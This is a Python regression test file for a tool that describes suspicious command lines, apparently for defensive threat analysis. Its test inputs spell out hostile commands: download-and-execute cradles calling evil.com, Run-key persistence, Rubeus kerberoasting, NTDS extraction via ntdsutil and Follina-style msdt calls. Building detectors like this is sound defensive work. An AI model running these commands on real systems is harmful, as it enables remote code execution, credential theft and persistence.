"""Targeted regression tests for the story.py improvements."""
from app.story import _describe_mechanics, _split_chain, _compress_encoding_chain


def m(cmd, binaries, layers=None):
    return _describe_mechanics({
        "command": cmd,
        "binaries_in_command": [{"name": b} for b in binaries],
        "decoded_layers": layers or [],
    })


# ── P0 ────────────────────────────────────────────────────────────────────────

def test_word_boundary_sc_not_claiming_schtasks():
    """'sc' must not match as a substring of 'schtasks'."""
    r = m("schtasks /create /sc DAILY /tn Malware /tr cmd.exe", ["schtasks", "sc"])
    assert r is not None
    assert "task scheduler" in r.lower()
    # 'sc' verb table would say "create a service" — must not appear
    assert "service" not in r.lower()


def test_word_boundary_at_not_claiming_attrib():
    """'at' must not match inside 'attrib'."""
    r = m("attrib +h C:\\malware.exe", ["attrib", "at"])
    assert r is not None
    assert "hide" in r.lower() or "attrib" in r.lower()
    assert "schedule" not in r.lower()


def test_cmd_inline_quote_aware_split():
    """&& inside double-quoted cmd /c arg must not be a split point."""
    segments = _split_chain('cmd /c "ping 1.2.3.4 && certutil -urlcache -f http://evil.com/file.exe"')
    # Should produce exactly one segment (the whole command)
    assert len(segments) == 1
    seg_text = segments[0][0]
    assert "certutil" in seg_text


def test_cmd_unquoted_chain_still_splits():
    """Unquoted && outside quotes must still split normally."""
    segments = _split_chain("cmd /c ping 1.2.3.4 && certutil -decode file.b64 file.exe")
    assert len(segments) == 2


# ── P1 ────────────────────────────────────────────────────────────────────────

def test_invokes_unified_to_uses():
    """Binaries with no matching verb pattern must produce 'Uses X.' not 'Invokes X.'."""
    r = m("ipconfig /all", ["ipconfig"])
    assert r is not None
    assert r.startswith("Uses")
    assert "Invokes" not in r


def test_silent_modifier_prefixes_verb():
    """'/quiet' must produce 'silently install/download', not trailing 'silently'."""
    r = m("msiexec /i http://evil.com/payload.msi /quiet", ["msiexec"])
    assert r is not None
    assert "silently" in r
    # 'silently' must appear before the object, not after it
    si = r.index("silently")
    # The word 'install' or 'download' should come AFTER 'silently'
    assert r.index("install", si) > si or r.index("download", si) > si if "download" in r else True


def test_url_not_surfaced_when_already_in_verb():
    """No duplicate host when verb already contains 'from' or 'to'."""
    r = m("curl -o /tmp/file.exe http://evil.com/file.exe", ["curl"])
    assert r is not None
    assert r.count("evil.com") <= 1


# ── P2 ────────────────────────────────────────────────────────────────────────

def test_rubeus_kerberoast_verb():
    r = m("Rubeus.exe kerberoast /outfile:hashes.txt", ["rubeus"])
    assert r is not None
    assert "kerberoast" in r.lower() or "Kerberoasting" in r


def test_rubeus_asktgt_verb():
    r = m("Rubeus.exe asktgt /user:admin /password:pass", ["rubeus"])
    assert r is not None
    assert "TGT" in r or "ticket" in r.lower()


def test_ntdsutil_ifm_verb():
    r = m("ntdsutil ifm create full c:\\temp", ["ntdsutil"])
    assert r is not None
    assert "Install-From-Media" in r or "NTDS" in r


def test_encoding_chain_compression_repeated():
    assert _compress_encoding_chain(["base64", "base64", "gzip"]) == "base64 (×2) → gzip"


def test_encoding_chain_compression_triple():
    assert _compress_encoding_chain(["base64", "base64", "base64"]) == "base64 (×3)"


def test_encoding_chain_no_compression_when_not_repeated():
    assert _compress_encoding_chain(["base64", "gzip"]) == "base64 → gzip"


def test_ps_inline_obfuscation_note_preserved():
    """Obfuscation layer note must appear even when PS inline analysis fires."""
    r = m(
        "powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')\"",
        ["powershell"],
        [{"encoding": "base64", "value": "decoded content"}],
    )
    assert r is not None
    assert "decode layer" in r


def test_run_key_persistence_detected_in_inline():
    """CurrentVersion\\Run (one backslash) must fire the persistence action."""
    r = m(
        r'powershell -c "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name backdoor -Value C:\evil.exe"',
        ["powershell"],
    )
    assert r is not None
    assert "persistence" in r.lower() or "startup" in r.lower() or "registry" in r.lower()


def test_ps_inline_segment_bounded_no_certutil_bleed():
    """Chained certutil after && must not pollute the PS inline description."""
    r = m(
        'powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil.com/a.ps1\')" && certutil -decode b64.txt out.exe',
        ["powershell", "certutil"],
    )
    assert r is not None
    # Must describe PS download/execute, not certutil decode
    assert "download" in r.lower() or "execute" in r.lower()
    # certutil's decode action must not appear as the primary description
    assert not r.startswith("Uses the Windows certificate utility")


def test_wsl_verb():
    r = m("wsl.exe -e /bin/bash -c 'curl http://evil.com/shell.sh | bash'", ["wsl"])
    assert r is not None
    assert "Linux" in r or "WSL" in r


def test_msdt_verb():
    r = m("msdt.exe /id PCWDiagnostic /skip force /param IT_RebrowseForFile=?", ["msdt"])
    assert r is not None
    assert "Follina" in r or "Diagnostic" in r or "msdt" in r.lower()
